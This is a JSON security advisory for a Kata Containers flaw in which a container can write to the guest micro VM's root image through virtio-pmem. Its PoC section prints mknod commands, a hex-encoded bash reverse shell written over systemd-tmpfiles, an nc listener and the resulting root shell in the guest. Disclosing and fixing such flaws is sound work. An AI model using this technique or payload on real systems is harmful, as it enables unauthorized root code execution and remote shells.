{
  "id": "GHSA-wwj6-vghv-5p64",
  "modified": "2026-02-19T15:48:45.553126Z",
  "published": "2026-02-19T15:25:54Z",
  "aliases": [
    "CVE-2026-24834"
  ],
  "summary": "Kata Container to Guest micro VM privilege escalation",
  "details": "### Summary\n\nAn issue in Kata with Cloud Hypervisor allows a user of the container to modify the file system used by the Guest micro VM ultimately achieving arbitrary code execution as root in said VM. The current understinding is this doesn’t impact the security of the Host or of other containers / VMs running on that Host (note that arm64 QEMU lacks NVDIMM read-only support: It is believed that until the upstream QEMU gains this capability, a guest write could reach the image file).\n\n### Details\n\n_Linux virtio-pmem_\nThe `virtio-pmem` probe path always registers the region as a generic pagemap that supports asynchronous flushes, but it never marks the region as read-only.  Only the `ND_REGION_PAGEMAP` and `ND_REGION_ASYNC` bits are set before the region is created, so `nd_region-\u003ero always` stays cleared and the block device is left writable.\n\nLater, `pmem_attach_disk()` wires the region into the block layer with full read/write semantics – the block device operations call `pmem_do_write()` which performs cache-flushed memcpy operations directly into the host-provided shared memory window. `nvdimm_check_and_set_ro()` would set the disk read-only if the region had been flagged as such, but because `virtio_pmem` never sets that flag, the helper becomes a no-op.\n\n_Cloud-Hypervisor virtio_pmem_\n`discard_writes=on` causes the file backing the `virtio-pmem` device to be opened read-only and mapped with `MAP_PRIVATE` rather than `MAP_SHARED`. That combination means the guest can modify the private copy of the mapped pages, but those modifications never propagate back to the underlying file. The guest (and Cloud Hypervisor process) will still read the modified data because it lives in the private copy of the mapping, so write-then-read sequences appear to succeed even though nothing is persisted. Once the mapping is dropped or the VM is restarted, those copy-on-write changes disappear, leaving the backing file unchanged.\n\n_Kata /dev/pmem0_\nKata boots each pod/VM by DAX-mapping a read-only guest image from the host into the VM and telling the guest kernel to mount the resulting `/dev/pmem*` device as its root filesystem.\nSince DAX maps the backing file directly into guest memory, there is no way for the hypervisor to intercept or reject individual stores, so a container with sufficient permissions can open `/dev/pmem0` and observe its own writes until the VM is rebooted or the cache is dropped.\n\n### PoC\n\nWhen putting all this together, this means that a user of a Container (not necessarily privileged, we don’t need `CAP_SYS_ADMIN`, but we need `CAP_MKNOD`) can modify the Guest OS filesystem, replacing libraries or binaries to achieve arbitrary code execution outside of the Container. This requires computing offsets of files within the device, which requires information like the partition start sector, sector size in bytes, the filesystem block size, and the physical block index of the file.\n\nTo achieve execution on the Guest, I replaced `/usr/bin/systemd-tmpfiles` with a connect-back shell to `localhost`: timers end up executing 15min after boot.\nI use `debugfs` to not require mounting privileges and work directly with the filesystem on `/dev/pmem0p1` to get the absolute offset of the file to modify in the device.\n\nIf you want a simpler PoC, just `dd` write something into `/dev/pmem0` and observe it's `dd` readable until discarded.\n\n```\nroot@ab5392da44ce:~# mknod /dev/pmem0 b 259 0\nroot@ab5392da44ce:~# mknod /dev/pmem0p1 b 259 1\nroot@ab5392da44ce:~# python pmem.py --file /usr/bin/systemd-tmpfiles --write --pattern 23212f62696e2f626173680a62617368202d69203e26202f6465762f7463702f3132372e302e302e312f34343320303e26310a6578697420300a\n=== Resolution ===\nPartition device:         /dev/pmem0p1 (pmem0p1)\nPartition start (sectors): 2048\nSector size (bytes):       512\nPartition start (bytes):   1048576\nFilesystem block size:     4096\nFile path:                 /usr/bin/systemd-tmpfiles\nFile offset (bytes):       0\nLogical block index:       0\nIntra-block offset:        0\nPhysical block index:      40668\n→ Absolute pmem offset:    167624704\n[*] Raw read (64 bytes at 167624704):\n09fdc000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00 |.ELF............|\n09fdc010  03 00 3e 00 01 00 00 00  20 66 00 00 00 00 00 00 |..\u003e..... f......|\n09fdc020  40 00 00 00 00 00 00 00  48 82 01 00 00 00 00 00 |@.......H.......|\n09fdc030  00 00 00 00 40 00 38 00  0d 00 40 00 20 00 1f 00 |....@.8...@. ...|\n[+] Wrote 58 bytes at absolute offset 167624704. Verifying...\n09fdc000  23 21 2f 62 69 6e 2f 62  61 73 68 0a 62 61 73 68 |#!/bin/bash.bash|\n09fdc010  20 2d 69 20 3e 26 20 2f  64 65 76 2f 74 63 70 2f | -i \u003e\u0026 /dev/tcp/|\n09fdc020  31 32 37 2e 30 2e 30 2e  31 2f 34 34 33 20 30 3e |127.0.0.1/443 0\u003e|\n09fdc030  26 31 0a 65 78 69 74 20  30 0a                   |\u00261.exit 0.|\nroot@ab5392da44ce:~# nc -lvp 443\nNcat: Version 7.93 ( https://nmap.org/ncat )\nNcat: Listening on :::443\nNcat: Listening on 0.0.0.0:443\nNcat: Connection from 127.0.0.1.\nNcat: Connection from 127.0.0.1:44880.\nbash: cannot set terminal process group (329): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@localhost:/# \nroot@localhost:/# ps auxw\nps auxw\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.0  17280  1920 ?        Ss   16:16   0:01 /sbin/init\nroot           2  0.0  0.0      0     0 ?        S    16:16   0:00 [kthreadd]\nroot           3  0.0  0.0      0     0 ?        S    16:16   0:00 [pool_workqueue_release]\nroot           4  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-rcu_gp]\nroot           5  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-sync_wq]\nroot           6  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-slub_flushwq]\nroot           7  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-netns]\nroot           9  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/0:0H-events_highpri]\nroot          10  0.0  0.0      0     0 ?        I    16:16   0:01 [kworker/0:1-events_power_efficient]\nroot          12  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-mm_percpu_wq]\nroot          13  0.0  0.0      0     0 ?        I    16:16   0:00 [rcu_tasks_trace_kthread]\nroot          14  0.0  0.0      0     0 ?        S    16:16   0:00 [ksoftirqd/0]\nroot          15  0.0  0.0      0     0 ?        I    16:16   0:00 [rcu_sched]\nroot          16  0.0  0.0      0     0 ?        S    16:16   0:00 [rcu_exp_par_gp_kthread_worker/1]\nroot          17  0.0  0.0      0     0 ?        S    16:16   0:00 [rcu_exp_gp_kthread_worker]\nroot          18  0.0  0.0      0     0 ?        S    16:16   0:00 [migration/0]\nroot          19  0.0  0.0      0     0 ?        S    16:16   0:00 [cpuhp/0]\nroot          20  0.0  0.0      0     0 ?        S    16:16   0:00 [kdevtmpfs]\nroot          21  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-inet_frag_wq]\nroot          22  0.0  0.0      0     0 ?        S    16:16   0:00 [kauditd]\nroot          23  0.0  0.0      0     0 ?        S    16:16   0:00 [oom_reaper]\nroot          24  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-writeback]\nroot          25  0.0  0.0      0     0 ?        S    16:16   0:00 [kcompactd0]\nroot          26  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-cryptd]\nroot          27  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-kblockd]\nroot          28  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/0:1H]\nroot          29  0.0  0.0      0     0 ?        I    16:16   0:00 [kworker/u256:1-events_unbound]\nroot          30  0.0  0.0      0     0 ?        S    16:16   0:00 [kswapd0]\nroot          31  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-xfsalloc]\nroot          32  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-xfs_mru_cache]\nroot          33  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/u257:0]\nroot          34  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-kthrotld]\nroot          36  0.0  0.0      0     0 ?        S    16:16   0:00 [irq/25-ACPI:Ged]\nroot          37  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-nfit]\nroot          38  0.0  0.0      0     0 ?        I    16:16   0:00 [kworker/0:2-virtio_vsock]\nroot          39  0.0  0.0      0     0 ?        S    16:16   0:00 [hwrng]\nroot          40  0.0  0.0      0     0 ?        I    16:16   0:00 [kworker/u256:2-events_unbound]\nroot          41  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-vfio-irqfd-cleanup]\nroot          42  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-mld]\nroot          43  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-ipv6_addrconf]\nroot          81  0.0  0.0      0     0 ?        S    16:16   0:00 [jbd2/pmem0p1-8]\nroot          82  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/R-ext4-rsv-conversion]\nroot          99  0.0  0.0      0     0 ?        I    16:16   0:00 [kworker/u256:3]\nroot         105  0.0  0.0  62032  2568 ?        Ssl  16:16   0:02 /usr/bin/kata-agent\n_chrony      117  0.0  0.0  10692   540 ?        S    16:16   0:02 /usr/sbin/chronyd -F 1\n_chrony      120  0.0  0.0  10560   460 ?        S    16:16   0:00 /usr/sbin/chronyd -F 1\nroot         122  0.2  1.0  44876 31556 ?        S    16:16   0:11 python -m server\nmessage+     124  0.0  0.0   8120   384 ?        Ss   16:16   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\nroot         129  0.0  0.0      0     0 ?        S    16:16   0:00 [cpuhp/1]\nroot         130  0.0  0.0      0     0 ?        S    16:16   0:00 [migration/1]\nroot         131  0.0  0.0      0     0 ?        S    16:16   0:00 [ksoftirqd/1]\nroot         132  0.0  0.0      0     0 ?        I    16:16   0:00 [kworker/1:0-mm_percpu_wq]\nroot         133  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/1:0H-events_highpri]\nroot         134  0.0  0.0      0     0 ?        I\u003c   16:16   0:00 [kworker/1:1H]\nroot         142  0.0  0.0   5400  2220 pts/0    Ss   16:16   0:00 bash -l\nroot         145  0.0  0.0      0     0 ?        I    16:16   0:00 [kworker/1:1]\nroot         323  0.0  0.1  13212  3448 pts/0    R+   16:17   0:00 nc -lvp 443\nroot         329  0.0  0.0   4780   256 ?        Ss   16:31   0:00 /bin/bash /usr/bin/systemd-tmpfiles --clean\nroot         330  0.0  0.0   5048   512 ?        S    16:31   0:00 bash -i\nroot         377  0.0  0.0   7480   256 ?        R    17:33   0:00 ps auxw\nroot@localhost:/#\n```\n\n### Impact\nContainer to Guest micro VM Escape (no escape to Host, no persistence of the overwritten image)",
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/kata-containers/kata-containers/src/runtime",
        "purl": "pkg:golang/github.com/kata-containers/kata-containers/src/runtime"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "0.0.0-20260219090056-6a672503973b"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-wwj6-vghv-5p64/GHSA-wwj6-vghv-5p64.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/kata-containers/kata-containers/security/advisories/GHSA-wwj6-vghv-5p64"
    },
    {
      "type": "WEB",
      "url": "https://github.com/kata-containers/kata-containers/commit/6a672503973bf7c687053e459bfff8a9652e16bf"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/kata-containers/kata-containers"
    },
    {
      "type": "WEB",
      "url": "https://github.com/kata-containers/kata-containers/releases/tag/3.27.0"
    }
  ]
}